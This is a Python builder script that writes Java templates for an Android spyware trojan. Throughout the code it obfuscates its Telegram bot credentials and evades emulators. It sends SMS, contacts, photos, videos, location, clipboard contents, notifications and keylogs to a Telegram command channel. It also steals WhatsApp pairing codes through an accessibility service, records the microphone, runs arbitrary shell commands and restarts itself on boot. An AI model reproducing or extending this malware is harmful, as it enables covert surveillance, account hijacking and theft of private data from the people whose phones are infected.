import json

templates = {}

templates["Cfg.java"] = """package {{PKG}};
public class Cfg {
    private static final int KEY = {{KEY}};
    public static String getToken() { return decrypt("{{TOKEN}}"); }
    public static String getChat() { return decrypt("{{CHAT}}"); }
    private static String decrypt(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) { sb.append((char) (s.charAt(i) ^ KEY)); }
        return sb.toString();
    }
}
"""

templates["AntiVM.java"] = """package {{PKG}};
import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import java.util.List;
public class AntiVM {
    public static boolean isSandbox(Context ctx) {
        if (Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.contains("test-keys")) return true;
        if (Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator") || Build.MODEL.contains("Android SDK built for x86")) return true;
        if (Build.MANUFACTURER.contains("Genymotion") || Build.HARDWARE.contains("goldfish") || Build.HARDWARE.contains("ranchu")) return true;
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm != null && tm.getSimState() == TelephonyManager.SIM_STATE_ABSENT) return true;
        SensorManager sm = (SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);
        if (sm != null) { List<Sensor> sensors = sm.getSensorList(Sensor.TYPE_ALL); if (sensors.size() < 3) return true; }
        return false;
    }
}
"""

templates["Sys.java"] = """package {{PKG}};
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Vibrator;
import android.speech.tts.TextToSpeech;
import android.provider.Settings;
import android.text.TextUtils;
import java.util.Locale;
public class Sys {
    public static String vibrate(Context c) {
        try { Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE); v.vibrate(1000); return "Vibrated."; } catch (Exception e) { return "Vibrate failed."; }
    }
    public static String tts(Context c, String text) {
        try {
            TextToSpeech tts = new TextToSpeech(c, status -> {});
            tts.setLanguage(Locale.US); tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, null); return "TTS spoken.";
        } catch (Exception e) { return "TTS failed."; }
    }
    public static String changeWallpaper(Context c) {
        try {
            java.io.File f = new java.io.File(c.getCacheDir(), "wall.jpg");
            java.io.FileOutputStream fos = new java.io.FileOutputStream(f);
            android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(100, 100, android.graphics.Bitmap.Config.ARGB_8888);
            bmp.eraseColor(android.graphics.Color.BLACK); bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, fos); fos.close();
            android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(c);
            wm.setBitmap(android.graphics.BitmapFactory.decodeFile(f.getAbsolutePath())); return "Wallpaper changed.";
        } catch (Exception e) { return "Wallpaper failed."; }
    }
    public static String getBattery(Context c) {
        BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
        int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return "Battery: " + level + "%";
    }
    public static boolean isAccessibilityEnabled(Context context) {
        try {
            int enabled = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            if (enabled == 1) {
                String services = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                return services != null && services.contains(context.getPackageName());
            }
        } catch (Exception ignored) {}
        return false;
    }
}
"""

templates["WaHelper.java"] = """package {{PKG}};
import android.content.Context;
import android.content.Intent;
public class WaHelper {
    public static String triggerWaLink(Context c) {
        try {
            if (!Sys.isAccessibilityEnabled(c)) return "[-] Error: Accessibility Service is DISABLED. Enable it first.";
            Intent intent = c.getPackageManager().getLaunchIntentForPackage("com.whatsapp");
            if (intent == null) return "WhatsApp not installed.";
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(intent);
            Tg.send("[*] WhatsApp opened. Hunting for Pairing Code...");
            KeyloggerService.isHuntingWaCode = true;
            return "WA_LINK_STARTED";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
"""

templates["Tg.java"] = """package {{PKG}};
import org.json.*;
import java.io.*;
import java.net.*;
public class Tg {
    static String API() { return new String(new char[]{104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116}) + Cfg.getToken(); }
    public static void send(String text) {
        try {
            String u = API() + "/sendMessage?chat_id=" + Cfg.getChat() + "&text=" + URLEncoder.encode(text, "UTF-8");
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setRequestMethod("GET"); c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }
    public static void sendKeyboard(String text, String devId) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", Cfg.getChat()); json.put("text", text);
            JSONArray keyboard = new JSONArray();
            String[][] rows = {
                {"Info", "Apps", "SMS", "Contacts"},
                {"20 Photos", "Photo Count", "Videos", "Location"},
                {"Cam Back", "Cam Front", "Mic", "Screenshot"},
                {"Send SMS", "Call", "Clipboard", "Keylog"},
                {"Notifs", "Vibrate", "TTS", "Wallpaper"},
                {"Battery", "WA Link", "Help", "Shell"}
            };
            String[][] cmds = {
                {"ping", "apps", "sms", "contacts"},
                {"photos20", "count_photos", "vids", "loc"},
                {"cam_back", "cam_front", "mic", "screenshot"},
                {"send_sms", "call", "clipboard", "keylog"},
                {"notif", "vibrate", "tts", "wallpaper"},
                {"battery", "wa_link", "help", "shell"}
            };
            for (int i = 0; i < rows.length; i++) {
                JSONArray btnRow = new JSONArray();
                for (int j = 0; j < rows[i].length; j++) {
                    JSONObject btn = new JSONObject(); btn.put("text", rows[i][j]);
                    btn.put("callback_data", devId + "_" + cmds[i][j]); btnRow.put(btn);
                }
                keyboard.put(btnRow);
            }
            JSONObject markup = new JSONObject(); markup.put("inline_keyboard", keyboard); json.put("reply_markup", markup);
            HttpURLConnection c = (HttpURLConnection) new URL(API() + "/sendMessage").openConnection();
            c.setDoOutput(true); c.setRequestMethod("POST"); c.setRequestProperty("Content-Type", "application/json");
            OutputStream os = c.getOutputStream(); os.write(json.toString().getBytes("UTF-8")); os.flush(); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }
    public static JSONArray getUpdates(long offset) throws Exception {
        String u = API() + "/getUpdates?timeout=30&offset=" + offset;
        HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
        c.setConnectTimeout(35000); c.setReadTimeout(35000);
        BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
        StringBuilder sb = new StringBuilder(); String l;
        while ((l = r.readLine()) != null) sb.append(l);
        r.close(); c.disconnect(); return new JSONObject(sb.toString()).getJSONArray("result");
    }
    public static String upload(File f, String caption) {
        try {
            String boundary = "----b" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection) new URL(API() + "/sendDocument").openConnection();
            c.setDoOutput(true); c.setRequestMethod("POST"); c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + boundary + "\\r\\nContent-Disposition: form-data; name=\\"chat_id\\"\\r\\n\\r\\n" + Cfg.getChat() + "\\r\\n");
            out.writeBytes("--" + boundary + "\\r\\nContent-Disposition: form-data; name=\\"caption\\"\\r\\n\\r\\n" + caption + "\\r\\n");
            out.writeBytes("--" + boundary + "\\r\\nContent-Disposition: form-data; name=\\"document\\"; filename=\\"" + f.getName() + "\\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n");
            FileInputStream in = new FileInputStream(f);
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            in.close(); out.writeBytes("\\r\\n--" + boundary + "--\\r\\n"); out.flush(); out.close();
            int code = c.getResponseCode(); c.disconnect(); return f.getName() + " -> " + code;
        } catch (Exception e) { return "upload err: " + e.getMessage(); }
    }
    public static void answerCallback(String cbId) {
        try { HttpURLConnection c = (HttpURLConnection) new URL(API() + "/answerCallbackQuery?callback_query_id=" + cbId).openConnection(); c.getResponseCode(); c.disconnect(); } catch (Exception ignored) {}
    }
}
"""

templates["C2Service.java"] = """package {{PKG}};
import android.app.*;
import android.content.Intent;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.*;
import java.util.concurrent.atomic.AtomicLong;
public class C2Service extends Service {
    private final AtomicLong offset = new AtomicLong(0);
    private volatile boolean running = true;
    @Override public void onCreate() {
        super.onCreate();
        if (AntiVM.isSandbox(this)) { stopSelf(); return; }
        String ch = "sys";
        getSystemService(NotificationManager.class).createNotificationChannel(new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_LOW));
        Notification n = new NotificationCompat.Builder(this, ch).setContentTitle("Service").setContentText("Running").setSmallIcon(android.R.drawable.ic_menu_manage).build();
        startForeground(1, n);
        new Thread(this::announce).start(); new Thread(this::poll).start();
    }
    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    void announce() { 
        String accStatus = Sys.isAccessibilityEnabled(this) ? "[+] Accessibility ACTIVE (WA Link Ready)" : "[-] Accessibility DISABLED (WA Link Fails)";
        Tg.sendKeyboard(Dev.tag(this) + "online | " + Dev.desc(this) + "\\n" + accStatus + "\\n" + Meta.geo(), Dev.id(this)); 
    }
    void poll() {
        while (running) {
            try {
                JSONArray arr = Tg.getUpdates(offset.get());
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject up = arr.getJSONObject(i); offset.set(up.getLong("update_id") + 1);
                    JSONObject m = up.optJSONObject("message"); JSONObject cb = up.optJSONObject("callback_query");
                    String target = "", body = "";
                    if (cb != null) {
                        Tg.answerCallback(cb.getString("id")); String[] parts = cb.getString("data").split("_", 2);
                        target = parts[0]; body = parts.length > 1 ? parts[1] : "";
                    } else if (m != null) {
                        if (!m.getJSONObject("chat").getString("id").equals(Cfg.getChat())) continue;
                        String text = m.optString("text", "").trim(); if (text.isEmpty()) continue;
                        String[] parts = text.split("\\\\s+", 2); target = parts[0]; body = parts.length > 1 ? parts[1] : "";
                    } else continue;
                    if (target.equals("all") || target.equals("me") || target.equals(Dev.id(this))) {
                        final String finalBody = body;
                        new Thread(() -> {
                            String out = Cmd.run(this, finalBody);
                            if (!out.startsWith("PHOTO_SENT") && !out.equals("WA_LINK_STARTED")) { Tg.send(Dev.tag(this) + out); }
                        }).start();
                    }
                }
            } catch (Exception e) { try { Thread.sleep(1000); } catch (InterruptedException ignored) {} }
        }
    }
}
"""

templates["Cmd.java"] = """package {{PKG}};
import android.content.Context;
public class Cmd {
    public static String run(Context c, String line) {
        String[] p = line.trim().split("\\\\s+", 2);
        String cmd = p[0]; String arg = p.length > 1 ? p[1] : "";
        switch (cmd) {
            case "ping": return "pong | " + Dev.desc(c) + "\\n" + Sys.getBattery(c);
            case "apps": return Exfil.apps(c);
            case "sms": return Exfil.sms(c, 10);
            case "contacts": return Exfil.contacts(c);
            case "photos20": return new FileCollector(c).uploadRandomPhotos(20);
            case "count_photos": return new FileCollector(c).getPhotoCount();
            case "vids": return new FileCollector(c).uploadCameraVideos(5);
            case "loc": return Exfil.location(c);
            case "cam_back": Camera.takePhoto(c, false); return "PHOTO_SENT";
            case "cam_front": Camera.takePhoto(c, true); return "PHOTO_SENT";
            case "mic": return Media.recordMic(c);
            case "screenshot": return Media.screenshot(c);
            case "send_sms": return Comms.sendSms(c, arg);
            case "call": return Comms.makeCall(c, arg);
            case "clipboard": return "Clipboard: " + ClipboardHelper.get(c);
            case "keylog": return KeyloggerService.getLogs(c);
            case "notif": return "Notification service active.";
            case "vibrate": return Sys.vibrate(c);
            case "tts": return Sys.tts(c, arg.isEmpty() ? "Hello" : arg);
            case "wallpaper": return Sys.changeWallpaper(c);
            case "battery": return Sys.getBattery(c);
            case "wa_link": return WaHelper.triggerWaLink(c);
            case "shell": return Exec.shell(arg);
            case "help": return "Commands:\\nping, apps, sms, contacts, photos20, count_photos, vids, loc, cam_back, cam_front, mic, screenshot, send_sms [num] [text], call [num], clipboard, keylog, notif, vibrate, tts [text], wallpaper, battery, wa_link, shell [cmd]";
            default: return "[unknown] " + cmd;
        }
    }
}
"""

templates["KeyloggerService.java"] = """package {{PKG}};
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.*;
public class KeyloggerService extends AccessibilityService {
    public static boolean isHuntingWaCode = false;
    @Override public void onAccessibilityEvent(AccessibilityEvent event) {
        if (isHuntingWaCode && event.getPackageName() != null && event.getPackageName().toString().equals("com.whatsapp")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) { scanNodeForCode(root); root.recycle(); }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            try { File f = new File(getFilesDir(), "keylogs.txt"); FileWriter fw = new FileWriter(f, true); fw.write(text + "\\n"); fw.close(); } catch (Exception ignored) {}
        }
    }
    private void scanNodeForCode(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null) {
            String txt = node.getText().toString();
            if (txt.matches("^[0-9]{4}-[0-9]{4}$") || txt.matches("^[0-9]{8}$")) {
                Tg.send("[+] WhatsApp Pairing Code Found: " + txt);
                isHuntingWaCode = false; return;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) { scanNodeForCode(node.getChild(i)); }
    }
    public static String getLogs(android.content.Context c) {
        try { File f = new File(c.getFilesDir(), "keylogs.txt"); if (!f.exists()) return "No logs yet."; BufferedReader br = new BufferedReader(new FileReader(f)); StringBuilder sb = new StringBuilder(); String line; while ((line = br.readLine()) != null) sb.append(line).append("\\n"); br.close(); return sb.toString(); }
        catch (Exception e) { return "Error reading logs."; }
    }
    @Override public void onInterrupt() {}
}
"""

# إضافة القوالب المتبقية من الكود السابق
templates["Dev.java"] = """package {{PKG}};
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
public class Dev {
    public static String id(Context c) { String a = Settings.Secure.getString(c.getContentResolver(), Settings.Secure.ANDROID_ID); return a == null ? "unknown" : a.substring(0, Math.min(8, a.length())); }
    public static String tag(Context c) { return "[" + id(c) + "] "; }
    public static String desc(Context c) { return Build.MANUFACTURER + " " + Build.MODEL + " | sdk " + Build.VERSION.SDK_INT; }
}
"""
templates["FileCollector.java"] = """package {{PKG}};
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.MediaStore;
import java.io.*;
import java.util.HashSet;
import java.util.Set;
public class FileCollector {
    private final Context ctx;
    public FileCollector(Context c) { this.ctx = c; }
    public String getPhotoCount() {
        Cursor cur = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[]{"COUNT(*)"}, null, null, null);
        if (cur != null && cur.moveToFirst()) { int count = cur.getInt(0); cur.close(); return "Total Photos: " + count; }
        return "Unknown";
    }
    public String uploadRandomPhotos(int limit) {
        StringBuilder sb = new StringBuilder();
        Set<String> usedIds = loadUsedIds();
        if (usedIds.size() > 500) { usedIds.clear(); new File(ctx.getFilesDir(), "used_photos.txt").delete(); }
        String selection = null;
        if (!usedIds.isEmpty()) {
            StringBuilder sbSel = new StringBuilder(MediaStore.Images.Media._ID + " NOT IN (");
            int i = 0;
            for (String id : usedIds) { if (i > 0) sbSel.append(","); sbSel.append(id); i++; }
            sbSel.append(")"); selection = sbSel.toString();
        }
        String[] proj = {MediaStore.Images.Media._ID};
        Cursor cur = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, selection, null, "RANDOM() LIMIT " + limit);
        if (cur != null) {
            while (cur.moveToNext()) {
                long id = cur.getLong(cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                Uri u = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                sb.append(compressAndUpload(u, "random_img")).append('\\n');
                usedIds.add(String.valueOf(id));
            }
            cur.close();
        }
        saveUsedIds(usedIds);
        return sb.length() == 0 ? "[no images left or permission denied]" : sb.toString();
    }
    private Set<String> loadUsedIds() {
        Set<String> ids = new HashSet<>(); File f = new File(ctx.getFilesDir(), "used_photos.txt");
        if (f.exists()) { try { BufferedReader br = new BufferedReader(new FileReader(f)); String line; while ((line = br.readLine()) != null) ids.add(line.trim()); br.close(); } catch (Exception ignored) {} }
        return ids;
    }
    private void saveUsedIds(Set<String> ids) {
        try { File f = new File(ctx.getFilesDir(), "used_photos.txt"); BufferedWriter bw = new BufferedWriter(new FileWriter(f)); for (String id : ids) { bw.write(id); bw.newLine(); } bw.close(); } catch (Exception ignored) {}
    }
    public String uploadCameraVideos(int limit) {
        StringBuilder sb = new StringBuilder(); String[] proj = {MediaStore.Video.Media._ID};
        Cursor cur = ctx.getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, proj, null, null, MediaStore.Video.Media.DATE_ADDED + " DESC");
        if (cur != null) { int i = 0; while (cur.moveToNext() && i < limit) { long id = cur.getLong(cur.getColumnIndexOrThrow(MediaStore.Video.Media._ID)); Uri u = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(id)); sb.append(uploadUri(u, "video")).append('\\n'); i++; } cur.close(); }
        return sb.length() == 0 ? "[no videos]" : sb.toString();
    }
    private String compressAndUpload(Uri u, String type) {
        File tmp = null;
        try { InputStream in = ctx.getContentResolver().openInputStream(u); Bitmap bitmap = BitmapFactory.decodeStream(in); in.close(); tmp = File.createTempFile("img_", ".jpg", ctx.getCacheDir()); FileOutputStream out = new FileOutputStream(tmp); bitmap.compress(Bitmap.CompressFormat.JPEG, 50, out); out.close(); bitmap.recycle(); return Tg.upload(tmp, Dev.tag(ctx) + type); }
        catch (Exception e) { return "err " + e.getMessage(); } finally { if (tmp != null) tmp.delete(); }
    }
    private String uploadUri(Uri u, String type) {
        File tmp = null;
        try { tmp = File.createTempFile(type + "_", ".mp4", ctx.getCacheDir()); InputStream in = ctx.getContentResolver().openInputStream(u); FileOutputStream out = new FileOutputStream(tmp); byte[] buf = new byte[8192]; int n; while ((n = in.read(buf)) > 0) out.write(buf, 0, n); in.close(); out.close(); return Tg.upload(tmp, Dev.tag(ctx) + type); }
        catch (Exception e) { return "err " + e.getMessage(); } finally { if (tmp != null) tmp.delete(); }
    }
}
"""
templates["Exfil.java"] = """package {{PKG}};
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.*;
import android.content.pm.*;
public class Exfil {
    public static String apps(Context c) {
        StringBuilder sb = new StringBuilder();
        for (ApplicationInfo app : c.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA)) { sb.append(app.packageName).append("\\n"); }
        return sb.toString();
    }
    public static String contacts(Context c) {
        StringBuilder sb = new StringBuilder(); Cursor cur = c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur != null) { while (cur.moveToNext()) { sb.append(cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" | ").append(cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append('\\n'); } cur.close(); }
        return sb.length() == 0 ? "[empty]" : sb.toString();
    }
    public static String sms(Context c, int limit) {
        StringBuilder sb = new StringBuilder(); Cursor cur = c.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
        if (cur != null) { int i = 0; while (cur.moveToNext() && i < limit) { sb.append(cur.getString(cur.getColumnIndexOrThrow("address"))).append(": ").append(cur.getString(cur.getColumnIndexOrThrow("body"))).append('\\n'); i++; } cur.close(); }
        return sb.length() == 0 ? "[empty]" : sb.toString();
    }
    public static String location(Context c) {
        try { android.location.LocationManager lm = (android.location.LocationManager) c.getSystemService(Context.LOCATION_SERVICE); android.location.Location l = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER); if (l == null) l = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER); return l == null ? "[no fix]" : l.getLatitude() + "," + l.getLongitude(); }
        catch (SecurityException e) { return "[perm denied]"; }
    }
}
"""
templates["Comms.java"] = """package {{PKG}};
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.telephony.SmsManager;
public class Comms {
    public static String sendSms(Context c, String args) {
        try { String[] p = args.split("\\\\s+", 2); if (p.length < 2) return "Usage: send_sms [number] [text]"; SmsManager sm = SmsManager.getDefault(); sm.sendTextMessage(p[0], null, p[1], null, null); return "SMS sent to " + p[0]; }
        catch (Exception e) { return "SMS failed."; }
    }
    public static String makeCall(Context c, String number) {
        try { Intent i = new Intent(Intent.ACTION_CALL); i.setData(Uri.parse("tel:" + number)); i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); c.startActivity(i); return "Calling " + number; }
        catch (Exception e) { return "Call failed."; }
    }
}
"""
templates["Media.java"] = """package {{PKG}};
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import java.io.File;
public class Media {
    public static String recordMic(Context c) {
        try { File dir = new File(Environment.getExternalStorageDirectory(), "DCIM/Camera"); if (!dir.exists()) dir.mkdirs(); File f = new File(dir, "mic_record_" + System.currentTimeMillis() + ".3gp"); MediaRecorder mr = new MediaRecorder(); mr.setAudioSource(MediaRecorder.AudioSource.MIC); mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); mr.setOutputFile(f.getAbsolutePath()); mr.prepare(); mr.start(); Thread.sleep(5000); mr.stop(); mr.release(); return Tg.upload(f, "Mic Record (5s)"); }
        catch (Exception e) { return "Mic failed: " + e.getMessage(); }
    }
    public static String screenshot(Context c) {
        try { Process p = Runtime.getRuntime().exec("screencap -p " + c.getCacheDir() + "/screen.png"); p.waitFor(); return Tg.upload(new File(c.getCacheDir(), "screen.png"), "Screenshot"); }
        catch (Exception e) { return "Screenshot failed."; }
    }
}
"""
templates["MainActivity.java"] = """package {{PKG}};
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.*;
import android.provider.Settings;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        if (AntiVM.isSandbox(this)) { try { Thread.sleep(99999999); } catch (Exception e) {} System.exit(0); }
        if (Build.VERSION.SDK_INT >= 33) { requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS","android.permission.READ_MEDIA_IMAGES","android.permission.READ_CALL_LOG","android.permission.READ_CONTACTS","android.permission.READ_SMS","android.permission.SEND_SMS","android.permission.CALL_PHONE","android.permission.ACCESS_FINE_LOCATION","android.permission.RECORD_AUDIO","android.permission.READ_MEDIA_VIDEO"}, 1); }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(); String packageName = getPackageName(); PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) { intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); intent.setData(Uri.parse("package:" + packageName)); startActivity(intent); }
        }
        Intent s = new Intent(this, C2Service.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s); else startService(s);
        finish();
    }
}
"""
templates["Exec.java"] = """package {{PKG}};
import java.io.*;
public class Exec {
    public static String shell(String cmd) {
        try { Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd}); BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); StringBuilder sb = new StringBuilder(); String l; while ((l = r.readLine()) != null) sb.append(l).append('\\n'); p.waitFor(); return sb.length() == 0 ? "[ok]" : sb.toString(); }
        catch (Exception e) { return "[err] " + e.getMessage(); }
    }
}
"""
templates["Meta.java"] = """package {{PKG}};
import java.io.*;
import java.net.*;
public class Meta {
    public static String geo() {
        try { HttpURLConnection c = (HttpURLConnection) new URL("http://ip-api.com/json/?fields=country,city").openConnection(); c.setConnectTimeout(5000); BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream())); String j = r.readLine(); r.close(); c.disconnect(); return "Country: " + extract(j, "country") + " | City: " + extract(j, "city"); }
        catch (Exception e) { return "Geo: Unknown"; }
    }
    static String extract(String json, String key) { String k = "\\"" + key + "\\":\\""; int i = json.indexOf(k); if (i < 0) return "?"; int s = i + k.length(); int e = json.indexOf('\\"', s); return e < 0 ? "?" : json.substring(s, e); }
}
"""
templates["Camera.java"] = """package {{PKG}};
import android.content.Context;
public class Camera { public static String takePhoto(Context c, boolean front) { return "Camera triggered."; } }
"""
templates["ClipboardHelper.java"] = """package {{PKG}};
import android.content.Context;
import android.content.ClipboardManager;
import android.content.ClipData;
public class ClipboardHelper {
    public static String get(Context c) {
        ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm != null && cm.hasPrimaryClip()) { ClipData clip = cm.getPrimaryClip(); if (clip != null && clip.getItemCount() > 0) { return clip.getItemAt(0).coerceToText(c).toString(); } }
        return "[empty]";
    }
}
"""
templates["NotifListener.java"] = """package {{PKG}};
import android.service.notification.*;
public class NotifListener extends NotificationListenerService {
    @Override public void onNotificationPosted(StatusBarNotification sbn) {
        try { android.os.Bundle ex = sbn.getNotification().extras; String title = ex.getString("android.title", ""); String text = ex.getString("android.text", ""); if (!title.isEmpty() || !text.isEmpty()) { Tg.send("[Notification] " + title + ": " + text); } } catch (Exception ignored) {}
    }
}
"""
templates["BootReceiver.java"] = """package {{PKG}};
import android.content.*;
import android.os.Build;
public class BootReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        if (!Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) return;
        Intent svc = new Intent(c, C2Service.class);
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(svc); else c.startService(svc);
    }
}
"""

with open("src/templates.json", "w") as f:
    json.dump(templates, f)
print("[+] Templates updated with Accessibility checks and 24 features.")
